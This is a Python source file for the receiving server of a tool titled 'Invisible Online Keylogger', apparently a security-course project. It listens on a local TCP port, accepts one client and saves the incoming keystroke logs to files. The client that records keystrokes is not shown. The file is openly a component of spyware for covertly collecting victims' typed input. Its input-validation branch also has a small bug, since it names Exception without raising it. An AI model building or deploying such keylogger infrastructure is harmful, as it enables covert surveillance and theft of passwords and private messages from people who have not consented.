import socket
import art
from colorama import Fore

#All used Functions (3)
#Artistic Information
artpost = art.text2art("Invisible Online Keylogger")
def info():
    print(Fore.RED,' Created By:  ---> Basil Abdulrahman')
    print(Fore.LIGHTBLACK_EX,'Version 1.0')
    print(Fore.GREEN)
#Manually Name Incoming Log Files and Save Them in the Log Folder.
def manName():
    while True:
        filename=input('pick a name for the incoming file\n')
        filename='C:\\Users\HP\PycharmProjects\CYS403Project\Logs\\'+filename+'.txt'
        file = open(filename,'wb')
        data=conn.recv(10000000)
        file.write(data)
        file.close()
        print(Fore.GREEN,'\nLog File Created Successfully.')
#Automatically Name Incoming Log Files (as log#) and Save Them in the Log Folder.
def autoName():
    for i in range(1,50):
        filename = 'C:\\Users\HP\PycharmProjects\CYS403Project\Logs\\'+f'log{i}.txt'
        file = open(filename, 'wb')
        data = conn.recv(16777216)
        file.write(data)
        file.close()
        print(Fore.GREEN,'\nLog File Created Successfully.')
#Call Title
print(Fore.GREEN +artpost)
#Call Info
info()

#Use Light Blue Font for the rest of the program.
print(Fore.LIGHTBLUE_EX)
#TCP Sever using Sockets, that waits for connections from only one client.
repeat= True
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
port=8080
hostname=socket.gethostname()
host='127.0.0.1'
print(Fore.CYAN,f'Host name: {hostname}')
s.bind((host,port))
s.listen(1)
print('Waiting for Connections...')
conn , addr = s.accept()
print(Fore.LIGHTRED_EX,addr,'Has Connected to the server')

#After initializing the connection, pick to manually or automatically name the log files *with error handling
print(Fore.YELLOW,"Do you want to name the files manually or do you want them named automatically\n1- Automatic Naming\n2- Manual Naming")
while repeat:
    try:
        nc=input('input 1 or 2:\n')
        if nc=='1':
            repeat = False
            autoName()
        elif nc=='2':
            repeat = False
            manName()
        else:
            Exception
    except:
        print('Only 1 or 2 are permitted!')
        continue